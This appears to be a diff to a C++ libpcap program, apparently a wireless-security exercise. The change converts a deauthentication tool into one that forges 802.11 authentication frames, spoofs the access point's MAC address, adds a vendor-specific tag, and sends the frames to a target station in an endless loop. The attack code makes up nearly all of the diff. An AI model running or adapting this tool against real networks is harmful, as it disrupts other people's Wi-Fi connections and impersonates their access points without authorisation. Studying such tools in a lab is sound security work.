@@ -37,13 +37,23 @@ struct Fixed_parameters {
 #pragma pack(pop)
 
 #pragma pack(push, 1)
+struct Tag_parameters {
+    uint8_t tag_num;
+    uint8_t tag_len;
+    uint8_t OUI[3];
+    uint16_t ven_Data[3];
+};
+#pragma pack(pop)
+
+#pragma pack(push, 1)
 struct Wir_Management {
-    Fixed_parameters Fixed_pa;
+    Fixed_parameters fixed_pa;
+    Tag_parameters  tag_pa;
 };
 #pragma pack(pop)
 
 
-struct Deauth_Packet {
+struct Authentication_Packet {
     Radiotap_header  radiotab;
     uint8_t nul[3];
     Deauth_Frame     d_frame;
@@ -52,8 +62,8 @@ struct Deauth_Packet {
 
 
 void usage() {
-    cout << "syntax : Aeauthentication <interface> <ap mac> [<station mac>]\n";
-    cout << "sample : Aeauthentication wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
+    cout << "syntax : Authentication <interface> <ap mac> <station mac>\n";
+    cout << "sample : Authentication wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
 }
 
 int main(int argc , char * argv[]) {
@@ -63,7 +73,7 @@ int main(int argc , char * argv[]) {
         return -1;
     }
 
-    cout << "** Aeautatication Start **\n";
+    cout << "** Authentication Start **\n";
 
     char * Interface = argv[1];
     char * AP_MAC = argv[2];
@@ -78,19 +88,24 @@ int main(int argc , char * argv[]) {
         return -1;
     }
 
-    Deauth_Packet packet;
+    Authentication_Packet packet;
 
     packet.radiotab.len = 0x000b;
     packet.d_frame.type = 0x00b0;
     packet.d_frame.dur = 0x013a;
     packet.d_frame.dst_mac = Mac(ST_MAC);
     packet.d_frame.src_mac = Mac(AP_MAC);
-    packet.d_frame.bssid = Mac(AP_MAC);
-    packet.w_manage.Fixed_pa.auth_SEQ = 0x0020;
+    packet.d_frame.bssid = Mac(ST_MAC);
+    packet.w_manage.fixed_pa.auth_SEQ = 0x0020;
+    packet.w_manage.tag_pa.tag_num = 0xdd;
+    packet.w_manage.tag_pa.tag_len = 9;
+    packet.w_manage.tag_pa.OUI[1] = 0x10;
+    packet.w_manage.tag_pa.OUI[2] = 0x18;
+
 
 
     while(1) {
-        int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packet),sizeof(Deauth_Packet));
+        int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packet),sizeof(Authentication_Packet));
         cout << "Packet  " << j << endl;
         j++;
         if (res != 0) {
